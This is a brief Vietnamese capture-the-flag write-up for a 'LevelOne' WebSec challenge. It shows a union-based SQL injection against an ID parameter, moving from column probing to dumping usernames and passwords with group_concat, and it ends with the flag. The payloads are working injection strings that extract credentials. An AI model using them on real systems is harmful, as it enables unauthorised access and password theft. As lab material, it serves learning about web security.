# LevelOne- Select the user by ID you wish to view
>Sqli ID
>
Đề bài cho câu lênh query sql sau : 

```sql
SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1
```
Ta nhập id = 1 và xem thử đầu ra => Thì thấy 2 trường đầu ra gồm id và username 
![id](https://github.com/tinasahara1/Study/blob/4d55fb78fcaa93466bf002059f47813c4522b60f/WebSec/image/id1.PNG)

Sau đó test thử payload với column = 2 để kiểm tra lỗ hổng => payload `1 union select 1,2-- -`
![id](https://github.com/tinasahara1/Study/blob/e159b1e37be66b1d5835208db76e3c848dc67e5b/WebSec/image/id3.PNG)

Đầu ra cho thấy cả 2 column 1,2 đều lỗi => Ta group_concat(username) để tìm flag thử 
```sql
1 union select 1,group_concat(username) from users;
```

![id](https://github.com/tinasahara1/Study/blob/70136a974f491dc499021b4fc7152f83dfa8a9a3/WebSec/image/id_4.PNG)


Nhưng vẫn không thấy ta thử tiếp phần password và tìm thấy flag :
```sql
1 union select 1,group_concat(password) from users;
```

![id](https://github.com/tinasahara1/Study/blob/3bcf48f054953d8366acef0111ed71c7239dc71f/WebSec/image/id_flag.PNG)

Flag: `WEBSEC{Simple_SQLite_Injection}`
